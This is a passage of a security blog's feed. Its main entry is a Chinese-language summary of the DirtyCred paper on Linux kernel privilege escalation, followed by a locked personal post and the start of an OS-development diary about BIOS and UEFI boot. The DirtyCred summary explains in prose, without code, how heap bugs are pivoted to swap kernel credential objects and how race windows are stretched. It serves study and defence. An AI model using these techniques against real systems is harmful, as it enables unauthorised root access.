    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="RootKit" scheme="https://arttnba3.github.io/tags/RootKit/"/>
    
    <category term="Virus" scheme="https://arttnba3.github.io/tags/Virus/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x05】论文笔记：DirtyCred: Escalating Privilege in Linux Kernel</title>
    <link href="https://arttnba3.github.io/2023/12/31/PAPER-0X05-DIRTY_CRED/"/>
    <id>https://arttnba3.github.io/2023/12/31/PAPER-0X05-DIRTY_CRED/</id>
    <published>2023-12-30T19:34:16.000Z</published>
    <updated>2023-12-30T09:00:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>新瓶装旧酒的 114514 种写法</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>DirtyCred 在 <a href="https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf">blackhat usa 2022上的演讲 ppt</a> 和<a href="https://zplin.me/papers/DirtyCred.pdf">发在 CCS 上的论文</a>笔者很早就看过了，简而言之这个利用手法的思路其实算是比较容易理解的，所以理论上来说并没有必要专门写一篇博客，但是最近刚好需要做关于 DirtyCred 的技术分享，以及 12 🈷笔者暂且一篇技术型博客都还没有写，为了不破坏<a href="https://arttnba3.cn/2000/10/12/hello-world/#About-the-blog">曾经给自己定下来的规矩</a>，笔者决定简单水一篇关于 DirtyCred 的博客：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">DirtyPipe</a> 在安全社区引起了一阵狂欢，但这个手法限制太多了，因此作者给出新的类似的利用方法——<code>DirtyCred</code> ，通过篡改<strong>凭证</strong>（credential）结构体来进行利用，同时作者还给出了防范手段</p><p><strong>KEYWORDS</strong>：OS Security; Kernel Exploitation; Privilege Escalation</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><p>Linux 对于黑客们而言非常流行，但 KASLR、CFI 等防护手段让利用变得困难，因此 <a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">CVE-2022-0847</a> （DirtyPipe）的出现引发了热潮——她不需要与众多内核防护措施，但仍存在不够普适的缺陷</p><blockquote><p>笔者注：这里作者为了抬高自己的手法在前面贬低了一嘴 DirtyPipe 做铺垫，但其实将漏洞转换为 DirtyPipe 已经是非常常见的利用方式了，就笔者所知 DirtyPipe 比 DirtyCred 实际上<strong>适用性是更加广泛的，现在在 CTF 与真实世界漏洞利用中大家都倾向于将漏洞转为 DirtyPipe、而并非 DirtyCred 进行利用</strong>， <del>但是为了发论文嘛肯定得自吹自擂一手</del></p></blockquote><p>本文提出一种通用利用手法——<code>DirtyCred</code> ，其并不基于管道机制或是 CVE-2022-0847，而是通过堆漏洞将低权限的 credentials 结构体替换为高权限的 credentials，简而言之本文贡献如下：</p><ul><li>提出了新的利用手法 DirtyCred，其可以规避许多内核保护机制</li><li>证明了 DirtyCred 可以在真实世界漏洞中广泛进行利用</li><li>分析现有内核保护机制并设计出了一种新的保护机制</li></ul><h1 id="0x02-Background-Threat-Model"><a href="#0x02-Background-Threat-Model" class="headerlink" title="0x02. Background &amp; Threat Model"></a>0x02. Background &amp; Threat Model</h1><h2 id="2-1-Credentials-in-Linux-kernel"><a href="#2-1-Credentials-in-Linux-kernel" class="headerlink" title="2.1 Credentials in Linux kernel"></a>2.1 Credentials in Linux kernel</h2><p><strong>凭证</strong>（credentials）指内核中包含权限信息的东西，在 Linux 内核中被实现为带有权限信息的内核对象（包括 <code>cred</code>、<code>file</code>、<code>inode</code>，本文仅用前两个因为第三个仅会在创建文件时被分配）：</p><ul><li>Linux 内核中每个进程都有一个指向 <code>cred</code> 对象的指针，其中有着该进程的权限信息，如当进程要访问文件时便会检查 cred 的 UID；cred 对象还描述了能力（capability），如 <code>CAP_NET_BIND_SERVICE</code> 说明了进程可以将一个套接字绑定到一个端口上</li><li>Linux 内核中每个文件都有着对应的权限设置，且与 inode 对象绑定，在进程要打开文件前内核会调用 <code>inode_permission</code> 检查权限，在文件打开后 <code>file</code> 对象用以记录权限设置</li></ul><h2 id="2-2-Kernel-Heap-Memory-Management"><a href="#2-2-Kernel-Heap-Memory-Management" class="headerlink" title="2.2 Kernel Heap Memory Management"></a>2.2 Kernel Heap Memory Management</h2><blockquote><p>建议看 <a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">【OS.0x04】Linux 内核内存管理浅析 III - Slub Allocator</a></p></blockquote><p>内核堆对象有两种缓存池：</p><ul><li><strong>通用缓存</strong>（Generic Caches）：相同大小的都能从这类池中进行分配</li><li><strong>专用缓存</strong>（Dedicated Caches）：出于安全与性能目的考虑设计的仅供某些结构体分配的池</li></ul><h2 id="2-3-Threat-Model"><a href="#2-3-Threat-Model" class="headerlink" title="2.3 Threat Model"></a>2.3 Threat Model</h2><p>作者假设非特权本地用户可以访问 Linux 系统，目的是利用堆内存损坏漏洞进行提权，并假设上游（5.15）所有缓解措施与保护机制都已启用（包括KASLR、SMAP、SMEP、CFI、KPTI 等）</p><h1 id="0x03-Technical-Overview-Challenges"><a href="#0x03-Technical-Overview-Challenges" class="headerlink" title="0x03. Technical Overview &amp; Challenges"></a>0x03. Technical Overview &amp; Challenges</h1><h2 id="3-1-Overview"><a href="#3-1-Overview" class="headerlink" title="3.1 Overview"></a>3.1 Overview</h2><p>作者使用 CVE-2021-4154 作为例子说明 DirtyCred，这是一个 <code>fs_context</code> 对象错误引用 <code>file</code> 对象所导致的类型混淆错误，这允许将正在使用中的 <code>file</code> 进行释放</p><p>如图 1 所示：</p><ul><li>首先打开可写文件 <code>/tmp/x</code> 分配一个 <code>file</code> ，之后尝试进行数据写入，权限检查通过，之后 DirtyCred 将文件写入暂停</li><li>接下来触发漏洞将 <code>file</code> 结构体释放</li><li>之后打开只读文件 <code>/etc/passwd</code> 重新取回该 <code>file</code> 对象，并恢复数据写入，此时便成功完成越权写</li></ul><p>该例子只是用来说明 DirtyCred 如何利用 file 结构体进行利用，如 Section 2 所言，除了 <code>file</code> 以外，<code>cred</code> 也可以作为利用对象</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230070520.png"></p><p>从真实世界案例中可以看出 DirtyCred 不会劫持控制流，本质上是操纵内存中的内核对象，因此许多现有的控制流防护手段无法进行防御，一些工作（如 <a href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game/">AUTOSLAB</a>）则在对抗 DirtyCred，但如第 8 节所言其仍无法防御这种手段</p><h2 id="3-2-Technical-Challenges"><a href="#3-2-Technical-Challenges" class="headerlink" title="3.2 Technical Challenges"></a>3.2 Technical Challenges</h2><p>DirtyCred 仍面临一些挑战：</p><ul><li>DirtyCred 需要 invalid-free capability 去释放掉一个低权限对象并重新分配为高权限对象，这种能力通常难以获得，因此 DirtyCred 需要将漏洞的不同能力转为所需能力，我们将在第 4 节进行描述</li><li>DirtyCred 需要暂停文件写入操作，这同样是一个挑战，我们将在第 5 节中介绍可以达成该目标的多种机制</li><li>DirtyCred 的关键步骤是要用高权限凭证替换掉低权限的，但对于低权限用户而言分配高权限凭证也是一个挑战，我们将在第 6 节中给出解决方案</li></ul><h1 id="0x04-Pivoting-Vulnerability-Capability"><a href="#0x04-Pivoting-Vulnerability-Capability" class="headerlink" title="0x04. Pivoting Vulnerability Capability"></a>0x04. Pivoting Vulnerability Capability</h1><blockquote><p>Pwn 人基本功了嗷，憋和👴说你不会嗷</p></blockquote><p>虽然 CVE-2021-4154 展示了 DirtyCred 的威力，但实战中我们并不一定有这样的能力，因此我们需要进行能力转换（笔者注：漏洞迁移的概念）</p><h2 id="4-1-Pivoting-OOB-UAF-Write"><a href="#4-1-Pivoting-OOB-UAF-Write" class="headerlink" title="4.1 Pivoting OOB &amp; UAF Write"></a>4.1 Pivoting OOB &amp; UAF Write</h2><p>如图 2 所示，我们可以通过 partial overwrite 将包含指向凭证对象的指针的内核对象进行复写，使得两个指针指向同一个凭证对象，从而进行 DirtyCred，由于堆喷连续分配的结构体通常分组来自相同 slab，因此可行性很高</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230072228.png"></p><h2 id="4-2-Pivoting-DF"><a href="#4-2-Pivoting-DF" class="headerlink" title="4.2 Pivoting DF"></a>4.2 Pivoting DF</h2><p>通用缓存（如 <code>kmalloc-96</code>）与专用缓存（如 <code>cred_jar</code>）间存在隔离，但我们可以通过释放缓存页面并重新分配的方式使得跨缓存的内存操作成为可能，如图 3 所示，我们先分配大量对象，通过漏洞我们有两个指针指向同一对象，在大量分配后我们将其大量释放，并保留一个垂悬指针，之后再分配为凭证结构体对象，以此进行 DirtyCred</p><blockquote><p>笔者注：这个手法也出现在笔者近期供给某些 CTF 比赛中的 kernel pwn 题中，可惜怎么都是 0 解（恼）</p></blockquote><p>但如图 3(f) 所示，漏洞对象大小不一定匹配凭证对象大小，从而无法 DirtyCred，这种情况下我们需要保有两个指针，将其中一个释放掉从而构造出空内存槽以分配为凭证结构体，再进行释放以获取所需能力</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230072544.png"></p><h1 id="0x05-Extending-Time-Window"><a href="#0x05-Extending-Time-Window" class="headerlink" title="0x05. Extending Time Window"></a>0x05. Extending Time Window</h1><p>DirtyCred 需要我们延长权限检查到写入之间的时间窗口</p><h2 id="5-1-Exploitation-of-Userfaultfd-FUSE"><a href="#5-1-Exploitation-of-Userfaultfd-FUSE" class="headerlink" title="5.1 Exploitation of Userfaultfd &amp; FUSE"></a>5.1 Exploitation of Userfaultfd &amp; FUSE</h2><blockquote><p>简而言之长话短说可以参见<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd%EF%BC%88may-obsolete%EF%BC%89">这里</a></p></blockquote><p>userfaultfd 允许我们在用户态手动处理缺页异常，FUSE 允许我们实现用户空间文件系统，这为延长时间窗口提供了可行性，如读写注册了 userfaultfd 的内存页或是读写 FUSE 文件来触发我们的自定义 handler 函数</p><p>下面我们以 userfaultfd 为例（FUSE 利用方式类似），DirtyCred 通过系统调用 <code>writev()</code> 进行文件写入，不同于 <code>write()</code> 系统调用，其使用 <code>iovec</code> 向量来传递数据，如 List 1 所示，4.13 版本前的系统调用 <code>writev()</code> 首先进行权限检查，之后再通过 <code>iovec</code> 向量导入用户空间数据，最后才是写入，因此 DirtyCred 可以很轻易地使用 userfaultfd 的特性来获得合适的时间窗口</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230164326.png"></p><p>这项技术初见于 <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808">CVE-2016-4557</a>，但现在已不再可用</p><h2 id="5-2-Alternative-Exploitation-of-Userfaultfd-FUSE"><a href="#5-2-Alternative-Exploitation-of-Userfaultfd-FUSE" class="headerlink" title="5.2 Alternative Exploitation of Userfaultfd &amp; FUSE"></a>5.2 Alternative Exploitation of Userfaultfd &amp; FUSE</h2><p>如 List 2 所示，在内核版本 4.13 之后导入 <code>iovec</code> 向量的步骤被移动到了权限检查之前，这使得我们不再能扩大权限检查与文件写入间的时间窗口，为了解决这个问题，DirtyCred 将利用 Linux 文件系统的设计</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230164938.png"></p><p>内核文件系统的设计遵循严格的层次关系，高层接口统一而低层接口各异，写入文件时会调用高层接口，如 List 3 所示， <code>generic_perform_write()</code> 为统一的高层接口，在第 15 ~ 17 行其会调用对应文件系统的写入操作，出于性能考虑内核在写入前会拷贝 iovec 向量数据，从而触发缺页异常，由此 DirtyCred 可以在第 10 行使用 userfaultfd 来延长时间窗口</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230201446.png"></p><p>与通过导入 <code>iovec</code> 来暂停内核的执行相比，对文件系统的设计进行利用则更难被缓解，如 List 3 中注释所言，移除 iovec 的 page fault 有可能造成死锁；将 page fault 移到权限检查前可能解决问题，但这会对性能造成影响，且仍存在潜在的被绕过的可能，如 DirtyCred 可以在 paeg fault 之后再移除该页，从而在拷贝时再次 page fault 以暂停（<del>有点扯了</del>）</p><h2 id="5-3-Exploitation-of-Lock-in-Filesystem"><a href="#5-3-Exploitation-of-Lock-in-Filesystem" class="headerlink" title="5.3 Exploitation of Lock in Filesystem"></a>5.3 Exploitation of Lock in Filesystem</h2><p>Linux 文件系统存在锁机制（如 List 4 为 ext4 中的锁），这为 DirtyCred 创造了机会，我们可以创建两个进程 A 与 B 同时写入同一文件，在 A 持有锁进行写入时 B 陷入等待，而在 <code>generic_perform_write()</code> 之前权限检查早已完成，由此 DirtyCred 可以通过写入大量数据来创造一个较长的时间窗口以完成 file 的替换（据作者观察写入 4GB 文件大概需要好几秒）</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230203419.png"></p><h1 id="0x06-Allocating-Privileged-Object"><a href="#0x06-Allocating-Privileged-Object" class="headerlink" title="0x06. Allocating Privileged Object"></a>0x06. Allocating Privileged Object</h1><p>DirtyCred 需要在内核空间分配特权对象，本节叙述如何以一个低权限用户做到这一点</p><h2 id="6-1-Allocation-from-Userspace"><a href="#6-1-Allocation-from-Userspace" class="headerlink" title="6.1 Allocation from Userspace"></a>6.1 Allocation from Userspace</h2><p><code>cred</code> 对象代表了对应内核进程的权限，因此 DirtyCred 可以通过执行 root-SUID 程序来创建 root 进程（而不用寻找这类程序中的漏洞），这样的程序包括 sudo、pkexec 等</p><p>DirtyCred 除了替换 <code>cred</code> 对象以外也可以通过替换 <code>file</code> 对象来提权，不过 <code>file</code> 对象的分配远比 <code>cred</code> 容易，以对应权限打开文件即可</p><h2 id="6-2-Allocation-from-Kernel-Space"><a href="#6-2-Allocation-from-Kernel-Space" class="headerlink" title="6.2  Allocation from Kernel Space"></a>6.2  Allocation from Kernel Space</h2><p>除了从用户空间分配特权对象以外，DirtyCred 也可以从内核空间分配特权对象，如生成新的特权内核线程完成特权凭证对象的分配，主要有两种方式：</p><ul><li>调用内核代码触发内核在内部生成特权线程，如通过向 <a href="https://docs.kernel.org/core-api/workqueue.html">工作队列</a> 提交任务让内核创建新的工作者线程</li><li>唤醒 usermode helper，如通过加载内核模块来让内核启动特权用户态 usermode helper 程序（如 modprobe）</li></ul><h1 id="0x07-Evaluation"><a href="#0x07-Evaluation" class="headerlink" title="0x07. Evaluation"></a>0x07. Evaluation</h1><p>作者设计了两个实验来在真实世界漏洞上评估 DirtyCred</p><h2 id="7-1-Experiment-Design-Setup"><a href="#7-1-Experiment-Design-Setup" class="headerlink" title="7.1 Experiment Design &amp; Setup"></a>7.1 Experiment Design &amp; Setup</h2><p>作者引入了一种自动化方法（设计实现参见附录 A）寻找可供 DirtyCred 利用的内核对象，并应用于 5.16.15 版本的内核</p><p>作者还探讨了针对实际漏洞利用的可行性，如第 4 节所言，若漏洞未直接提供交换凭证结构体的能力，则需要我们进行转换</p><p>作者假设 Linux 内核使用其最先进的防护手段，并在评估中仅选择 2019 年以后的 CVE，数据集如表 2 所示，这涵盖了几乎所有的堆上漏洞类型</p><h2 id="7-2-Experiment-Result"><a href="#7-2-Experiment-Result" class="headerlink" title="7.2 Experiment Result"></a>7.2 Experiment Result</h2><p><strong>可利用对象</strong>。表 1 展示了不同缓存池中可以被利用的内核对象，几乎所有通用缓存池（除了 <code>kmalloc-8</code> ）都有可供 DirtyCred 利用对象：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230204803.png"></p><p><strong>可利用性</strong>。表 2 显示了 DirtyCred 在不同漏洞上的可利用性，在开启所有防护的情况下其在 24 个漏洞中的 16 个上都完成了利用，这表明了其通用性与强大</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230205513.png"></p><blockquote><p>还有一些关于利用失败的阐述，这里笔者就不抄了</p></blockquote><h1 id="0x08-Defence-Against-DirtyCred"><a href="#0x08-Defence-Against-DirtyCred" class="headerlink" title="0x08. Defence Against DirtyCred"></a>0x08. Defence Against DirtyCred</h1><p>现有各种防护主要针对控制流劫持，难以对抗 DirtyCred，作者认为一种有效的对抗方式是隔离高权限与低权限对象，比较直接的想法是创建不同的缓存池，但这仍能通过跨缓存的页回收完成利用</p><p>基于上述考虑，作者设计的解决方案是为高权限对象在虚拟内存区域创建一个缓存（创建的凭证对象 ID 为 <code>GLOBAL_ROOT_UID</code> 时或以写权限打开文件时则使用 vmalloc 分配），同时低权限对象保留在正常内存区域，从而隔离开内存页；但运行时权限更改（如 setuid 系统调用）仍能破坏这种机制，作者的解决方案是为更改操作添加检查，若是改为 <code>GLOBAL_ROOT_UID</code> 则将高权限凭证对象复制到 vmalloc 区域而非更改原始对象，但这需要未来的内核开发遵循相同的模式，因此作者仍在探索替代解决方案</p><p>性能评估结果如表 3 所示：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230210827.png"></p><p>在这项工作中，作者称其主要目标是提高Linux社区的意识，而不是构建一个安全、高效的防御解决方案，且作者将探索替代防御解决方案作为未来研究的一部分</p><h1 id="0x09-Related-Work"><a href="#0x09-Related-Work" class="headerlink" title="0x09. Related Work"></a>0x09. Related Work</h1><p>这一节主要介绍与论文相关的两方面工作——内核利用（exploitation）与内核防护（defence），都是常识性内容所以这里笔者就不摘抄了：）</p><h1 id="0x10-Discussion-Future-Work"><a href="#0x10-Discussion-Future-Work" class="headerlink" title="0x10. Discussion &amp; Future Work"></a>0x10. Discussion &amp; Future Work</h1><p>这节讨论之前没提到的一些点：</p><ul><li><p><strong>Escaping container.</strong> 容器中的文件并不提供交换命名空间的能力，但<a href="https://www.datadoghq.com/blog/engineering/dirty-pipe-container-escape-poc/">一项最近的研究</a>显示攻击者可以被动等待 runC 进程，由此可以通过覆写进程来在 host 侧以 root 运行命令，DirtyCred 可以以此完成容器逃逸；利用 cred 对象则不需要被动等待，通过交换 cred 获得 <code>SYS_ADMIN</code> 权限使得攻击者可以挂载 cgroup 后利用 <code>notify_no_release</code> 机制来在 host 侧以 root 执行命令，作者在<a href="https://hackmd.io/giRE2P2oQHektZzOG053IQ">这里</a>给出了案例</p></li><li><p><strong>Rooting Android.</strong> 安卓也是 Linux 内核，DirtyCred 可以通过文中讨论的两种方式完成安卓提权，不过实战中安卓内核有着更严格的访问限制，直接交换 cred 是可行的，对于文件而言可以首先覆写共享库以完成沙箱逃逸，之后再覆写内核模块，作者在 0day 漏洞上用 DirtyCred 完成了利用并获得更Google 的致谢</p></li><li><p><strong>Cross version&#x2F;architecture exploitation.</strong> DirtyCred 的利用是跨版本跨架构的，因为其基本不需要内核信息，也不需要特定于架构的数据</p></li><li><p><strong>Other way to pivot capability.</strong> 虚拟内存区上的漏洞更难被转化为 DirtyCred，但不意味着无法使用 DirtyCred，如<a href="https://github.com/HexRabbit/CVE-writeup/tree/master/CVE-2021-34866">这个工作</a>将 vmalloc 区上的越界写漏洞 CVE-2021-34866 转为任意内存读写</p></li><li><p><strong>Stability.</strong> 稳定性主要受内存布局与漏洞触发方式影响，<a href="https://www.usenix.org/conference/usenixsecurity22/presentation/zeng">最近的一个工作</a>提出了一系列方法提高利用稳定性</p></li><li><p><strong>TOCTOU.</strong> （Time-Of-Check to Time-of-Use） DirtyCred 在关键时间窗口交换凭证对象，直觉告诉我们现有的 TOCTOU 防御方法可能会阻碍 DirtyCred，但针对<a href="https://ieeexplore.ieee.org/document/9718065/">最近一篇关于 TOCTOU 的研究文章</a>分析，实际上并不会，因为 DirtyCred 使用了意外的释放操作，而这在各种分析过程中不可见</p></li></ul><h1 id="0x11-Conclusion"><a href="#0x11-Conclusion" class="headerlink" title="0x11. Conclusion"></a>0x11. Conclusion</h1><p>作者开发了 Linux 内核通用利用手法 DirtyCred，很好很强大，撒花~🌸🌸🌸</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;新瓶装旧酒的 114514 种写法&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x05】过量电波重度依赖：再别电专</title>
    <link href="https://arttnba3.github.io/2023/12/21/PIECES-0X05-NEEDY_A3_OVERDOSE-0-GOODBYE_XDU/"/>
    <id>https://arttnba3.github.io/2023/12/21/PIECES-0X05-NEEDY_A3_OVERDOSE-0-GOODBYE_XDU/</id>
    <published>2023-12-20T19:30:41.000Z</published>
    <updated>2023-12-30T10:45:56.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码出错啦！但是题目还没出好所以暂且请等待..." data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="4de51144639fa16a8ecbdfa6582d90c8d1f285c11113223e663031ab4ef51287"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">题目还没出好所以暂且请等待</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">为什么要让我忘记呢 我们以前感情明明那么好 大家每天在一起都很开心 结果现在各奔东西什么的这太奇怪了 你不是说乐团是命运共同体吗 求求你 我想让crychic重新开始 我想找回大家那段快乐的日子 crychic没有结束 我一直为了它在努力着 等一下 不要走 我真的很喜欢大家很重视大家 求求你 ‍♀️要我怎么做你们才肯回来 ‍♀️只要是我能做的我什么都愿意做 ‍♀️我真的</summary>
    
    
    
    <category term="PIECES" scheme="https://arttnba3.github.io/categories/PIECES/"/>
    
    
    <category term="碎碎念" scheme="https://arttnba3.github.io/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>【CODE.0x03】现代 64 位 OS 开发手记 I：Cmake构建、UEFI 启动、GRUB 引导、Frame buffer 文字输出</title>
    <link href="https://arttnba3.github.io/2023/11/29/CODE-0X03-OSDEV64-I_UEFI-GRUB/"/>
    <id>https://arttnba3.github.io/2023/11/29/CODE-0X03-OSDEV64-I_UEFI-GRUB/</id>
    <published>2023-11-29T12:21:47.000Z</published>
    <updated>2024-06-19T03:55:56.968Z</updated>
    
    <content type="html"><![CDATA[<p>遥遥领先！遥遥领先！遥遥领先！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>很久以前在知乎上曾经有过一个“程序员的三大浪漫”的讲法：「编译原理」、「操作系统」、「图形学」——当然这个似乎是某些知名答主杜撰的并没有任何的由头神必说法，笔者自己也不认为所谓的“程序员的浪漫”就仅是这几个东西，但对于笔者而言，“自己动手编写一个可以正常运行的操作系统”确乎是一件<strong>非常炫酷的事情</strong></p><p>笔者此前在大二下学期的时候曾参照《操作系统真象还原》编写过一个非常简陋的只有打印功能的 32 位操作系统——严格来说笔者仅仅完成了一个高度客制化的 boot loader 加上一点点的 kernel（因为懒而不是时间不够，天天摆烂躺平打游戏😥），也没有在真机上测试过，完全算不上一个能用的操作系统；在大三寒假期间笔者花了将近一周的时间<a href="https://arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/">刷完了 MIT 6.828 的前四个 lab</a>，但那严格意义上来说也并不是笔者从零开始写的一个内核——大框架基本都是 MIT 搭好的，笔者仅仅只用补足非常微小的一部分；在大三下学期笔者想与曾经喜欢过的妹子一起参加一个<a href="https://os.educg.net/">写操作系统内核的比赛</a>，但是由于<a href="https://arttnba3.cn/2022/10/28/PIECES-0X04-SHELL_OUTSIDE-4-XIANG_WAN/">一些缘故</a>笔者一直拖到了比赛结束都还没有开始动手写第一行代码，最后也就不了了之了；在大四上学期笔者又重新写了一个<a href="https://github.com/arttnba3/SumiOS">用 Grub2 引导的 64 位内核</a>，但是写完内存分配之后也烂尾了 😅</p><blockquote><p>仔细想来对于笔者来说似乎很少存在“万事开头难”的阶段，但往往一切事物都会滑向无底的大坑永久无法填上：）</p></blockquote><p>因此趁着现在时间尚且充足，笔者想要<strong>真正地从零写一个可用的 64 位操作系统内核</strong>，算是满足自己多年来的一个梦想吧，名字的话笔者决定叫 <code>ClosureOS</code> ——这个名字的由来比较简单，笔者一直很难想出比较好听的名字，看了看市面上有各种操作系统都叫 <code>Open*</code> ，那笔者就叫 <code>Close</code> 好了，但是 <code>Close</code> 这个单词长得又不好看，于是笔者最终选择了 <code>Closure</code> 作为这个操作系统的名字——虽然似乎不是特别好听，但反正是否能写完都还是个未知数，所以也无所谓了（笑）</p><p>本项目代码开源在 <a href="https://github.com/arttnba3/ClosureOS">https://github.com/arttnba3/ClosureOS</a></p><h1 id="0x01-Boot-Firmware"><a href="#0x01-Boot-Firmware" class="headerlink" title="0x01. Boot Firmware"></a>0x01. Boot Firmware</h1><p>现代计算机的上电过程比较复杂，不过对于操作系统开发而言我们其实只需要关注<strong>当我们按下开机键之后所发生的事情</strong>，实际上无论是古老的 Legacy BIOS 启动还是逐渐成为主流的 UEFI 启动而言，其不外乎都遵循以下三个大阶段：</p><ul><li><strong>ROM Stage</strong>：经历了一些基本的初始化工作后 CPU 被重置，主核心被唤醒，指令指针寄存器指向 <code>reset vector</code>（固件入口点）并由此开始执行，此时尚未进行内存探测，需要直接在 ROM 上执行</li><li><strong>RAM Stage</strong>：内存探测完成，此时可以进行主板上各芯片组、CPU 等模块的初始化等工作</li><li><strong>Boot Stage</strong>：找到启动设备，完成启动设备前的依赖项的准备，将控制权移交给设备上的下一阶段的启动器</li></ul><p>现有的固件通常分为两类：BIOS 与 UEFI</p><h2 id="Legacy-BIOS"><a href="#Legacy-BIOS" class="headerlink" title="Legacy BIOS"></a>Legacy BIOS</h2><p><strong>基本输入输出系统</strong>（<strong>Basic Input&#x2F;Output System</strong>，BIOS）是用来为计算机提供初始化服务与运行时服务的一组固件，其被预装在主板的 ROM&#x2F;FLASH 芯片上，不同的 BIOS 通常仅能在特定的主板型号上运行</p><p>当计算机启动后 BIOS 为第一个被运行的软件，此时计算机处于实模式下，仅能访问 1MB 内存的空间，其中物理内存 <code>0xF0000 ~ 0xFFFFF</code> 这 64KB 空间被映射到 BIOS ROM 当中，并以 <code>0xFFFF0</code> 处作为 BIOS 程序的入口点开始执行</p><blockquote><p>对于支持且开启了 BIOS shadowing 特性的计算机而言，BIOS 会被先从固件当中拷贝到内存中，而非直接在 ROM 空间上执行</p></blockquote><p>BIOS 会从南桥的 CMOS 芯片中读取 BIOS 程序的设置值、硬件参数侦测值等信息，在完成加电自检、设备测试等工作之后，会从启动设备中读取第一个扇区到物理内存 <code>0x7c00</code> 的位置，该扇区被称为<strong>主引导记录</strong>（<strong>Master Boot Recode</strong>，MBR），随后 BIOS 会跳转到 <code>0x7c00</code> 处继续执行，控制权转交给 MBR</p><p>MBR 的结构如下图所示，其中<strong>不仅包含有 440 字节的第一阶段引导代码，同时还包含有磁盘的分区表信息</strong>，MBR 以末尾的两个字符 <code>0x55, 0xaa</code> 作为其标识：</p><blockquote><p>这里我们可以看到 MBR 分区表仅支持不超过四个主分区，多余的分区则需要依赖操作系统在其上建立虚拟分区，此外 MBR 也不支持管理硬盘 2TB 以外的存储空间，因此这种分区方式 <em>其实已经正在逐渐地被淘汰</em> </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113212038.png"></p><p>由于 MBR 仅有 512 字节，无法完成过多的任务，因此通常的设计是由 MBR 从硬盘上读取第二阶段的 boot loader，由其来完成后续的系统环境初始化、载入操作系统内核等工作</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113211739.png"></p><h2 id="Unified-Extensible-Firmware-Interface"><a href="#Unified-Extensible-Firmware-Interface" class="headerlink" title="Unified Extensible Firmware Interface"></a>Unified Extensible Firmware Interface</h2><p><strong>统一可扩展固件接口</strong>（<strong>Unified Extensible Firmware Interface</strong>，UEFI）为一套<strong>固件接口规范，用以初始化硬件、引导操作系统，并向操作系统提供一套统一的功能接口，解决不同厂牌 BIOS 分裂的现状</strong>，其最初起源于 Intel 开发的 EFI，在 2005 年由 Intel 交由 UEFI 论坛进行推广，<strong>UEFI 固件本质上与 BIOS 固件没有区别</strong>（都是封装在 ROM&#x2F;FLASH 固件里的程序）</p><blockquote><p>例如 BIOS 厂商 A 提供的某个功能接口的使用方式是 X，BIOS 厂商 B 